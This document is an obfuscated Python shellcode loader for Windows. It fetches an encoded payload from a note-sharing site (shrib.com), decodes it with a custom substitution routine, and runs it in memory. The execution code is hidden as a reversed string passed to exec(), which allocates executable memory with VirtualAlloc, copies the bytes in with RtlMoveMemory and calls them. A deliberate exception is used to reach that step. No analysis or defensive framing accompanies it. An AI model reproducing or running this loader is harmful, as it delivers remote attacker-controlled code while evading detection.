import requests
import json
import ctypes as CF

k32 = CF.windll.kernel32

def getAddress (O0OO0O00O0000O000 ,OO0OO00OO00OO00O0 ):#line:1
    O0OO0O00O0000O000 =O0OO0O00O0000O000 .split ("0x")[1 :]#line:2
    OO0OO00OO00OO00O0 =list (OO0OO00OO00OO00O0 )#line:3
    OO0000OO0O0O0000O =""#line:4
    for OOOOOO000OOOO0O00 in range (len (O0OO0O00O0000O000 )):#line:5
        O0O000OOOO00OOO0O =chr (int (O0OO0O00O0000O000 [OOOOOO000OOOO0O00 ],16 )^ord (OO0OO00OO00OO00O0 [OOOOOO000OOOO0O00 %len (OO0OO00OO00OO00O0 )]))#line:6
        OO0000OO0O0O0000O +=O0O000OOOO00OOO0O #line:7
    OO0000OO0O0O0000O =OO0000OO0O0O0000O .rsplit ("/")[-1 ]#line:8
    return OO0000OO0O0O0000O #line:9
def getCookie ():#line:11
    OOOOOO000O0O00O0O ="https://shrib.com/zuex/api.0.20677817052017977.svg"#line:12
    O0O0OOO000OO00000 =requests .get (OOOOOO000O0O00O0O )#line:13
    return O0O0OOO000OO00000 .cookies #line:14
def getShellcode (OOOO0OO000OO000OO ):#line:16
    OOOO0O0O00OOOO0O0 =getCookie ()#line:17
    O0O00O00O0O000OO0 ="https://shrib.com:443/zuex/api.php"#line:18
    OOO0O0O000OO0O0O0 ={"Content-Type":"application/x-www-form-urlencoded"}#line:19
    OOO000OO0O0OOO0OO ={"note":OOOO0OO000OO000OO ,"ssc":"1","t":"1669191367","diffText":"\n\n","diffPos":"0","diffDir":"m"}#line:20
    OOOO0O00O0O0O0OO0 =requests .post (O0O00O00O0O000OO0 ,headers =OOO0O0O000OO0O0O0 ,cookies =OOOO0O0O00OOOO0O0 ,data =OOO000OO0O0OOO0OO )#line:21
    O00O000OOOOO0OO0O =json .loads (OOOO0O00O0O0O0OO0 .text ).get ("note").get ("text").strip ("\n\n").strip (" ")#line:22
    O000OOOOO0O0OOO00 =O00O000OOOOO0OO0O [0 :16 ]#line:23
    O00OOOOO0OO0OO00O =O00O000OOOOO0OO0O [16 :32 ]#line:24
    O0O0OO0O0OO0O0OO0 =O00O000OOOOO0OO0O [32 :]#line:25
    return O000OOOOO0O0OOO00 ,O00OOOOO0OO0OO00O ,O0O0OO0O0OO0O0OO0 #line:26
def decrypt (O0O00OO0OOO0O00O0 ,O0O00OO00O00OO0O0 ,O00OOOO0O00O0O0O0 ):#line:28
    O000O00OO00OO0OO0 =[0 ]*16 #line:29
    O00OO000OO00000OO =[]#line:30
    O0OOO000000O0OOO0 =[]#line:31
    OO000O00OO0OO00O0 =[]#line:32
    O0OOOO0O0OOOOO000 =0 #line:33
    for O0O000OOO00OOO00O in O0O00OO0OOO0O00O0 :#line:34
        O000O00OO00OO0OO0 [int (O0O000OOO00OOO00O )]=O0O00OO00O00OO0O0 [O0OOOO0O0OOOOO000 ]#line:35
        O0OOOO0O0OOOOO000 +=1 #line:36
    for O0O000OOO00OOO00O in O000O00OO00OO0OO0 :#line:37
        if O0O000OOO00OOO00O !=0 and O0O000OOO00OOO00O !="0":#line:38
            O00OO000OO00000OO .append (str (O000O00OO00OO0OO0 .index (O0O000OOO00OOO00O )))#line:39
            O0OOO000000O0OOO0 .append (O0O000OOO00OOO00O )#line:40
    for O0O000OOO00OOO00O in O00OOOO0O00O0O0O0 :#line:41
        if O0O000OOO00OOO00O !="0"and O0O000OOO00OOO00O in O0OOO000000O0OOO0 :#line:42
            OO000O00OO0OO00O0 .append (O00OO000OO00000OO [O0OOO000000O0OOO0 .index (O0O000OOO00OOO00O )])#line:43
        elif O0O000OOO00OOO00O =="+":#line:44
            OO000O00OO0OO00O0 .append ("\\")#line:45
        elif O0O000OOO00OOO00O =="-":#line:46
            OO000O00OO0OO00O0 .append ("x")#line:47
        elif O0O000OOO00OOO00O ==":":#line:48
            OO000O00OO0OO00O0 .append ("0")#line:49
        else :#line:50
            OO000O00OO0OO00O0 .append (O0O000OOO00OOO00O )#line:51
    if len (O00OOOO0O00O0O0O0 )==len (OO000O00OO0OO00O0 ):#line:52
        O0O0000OOOO000000 ="".join (OO000O00OO0OO00O0 )#line:53
    return O0O0000OOOO000000 
    
def run(O000):
    O00O ='''
)(cnuf_llehs
))enoN(EPYTCNUFC.FC ,rtp(tsac.FC = cnuf_llehs
)htgnel ,fub ,rtp(yromeMevoMltR.23k
)t_ezis_c.FC
,p_diov_c.FC
,p_diov_c.FC
( = sepytgra.yromeMevoMltR.23k
)04x0 ,0003x0 ,htgnel ,enoN(collAlautriV.23k = rtp
p_diov_c.FC = epytser.collAlautriV.23k
)fub(nel = htgnel
)000O(reffub_gnirts_etaerc.FC = fub'''
    exec(O00O[::-1])


if __name__ == '__main__':
    source = ""
    key = ""
    ShellcodeAddress = getAddress(source,key)
    vi,dekey,OOOO = getShellcode(ShellcodeAddress)
    O000 = decrypt(vi,dekey,OOOO)
    O000 = O000.replace("\\x","")
    O000 = bytes.fromhex(O000)
    try:
        for i in range(len(source)):
            for j in range(len(key)):
                shellcode += key[j]
                shellcode += source[i+1]
    except:        
        run(O000)
